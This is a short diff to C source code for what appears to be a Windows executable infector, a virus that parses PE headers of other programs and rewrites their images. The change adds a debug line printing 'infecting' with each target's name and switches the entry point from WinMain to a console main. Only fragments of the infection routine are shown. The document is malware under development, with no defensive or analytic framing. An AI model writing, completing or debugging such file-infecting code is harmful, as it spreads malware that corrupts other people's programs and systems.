@@ -978,6 +978,8 @@ int infect(void)
       if (!is_infectable(&iat, &exe_buffer))
          goto free_file;
 
+      printf("infecting %s\n", executable);
+
       PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32, CVECTOR_CAST(&exe_buffer, uint8_t *)+CVECTOR_CAST(&exe_buffer, PIMAGE_DOS_HEADER)->e_lfanew);
       CVector rewritten_image;
 
@@ -1021,7 +1023,8 @@ int infect(void)
    return 0;
 }
 
-int WINAPI WinMain(HINSTANCE instance, HINSTANCE prev_instance, LPSTR command_line, int show_command)
+//int WINAPI WinMain(HINSTANCE instance, HINSTANCE prev_instance, LPSTR command_line, int show_command)
+int main(int argc, char *argv[])
 {
    //infect();
    return infect();
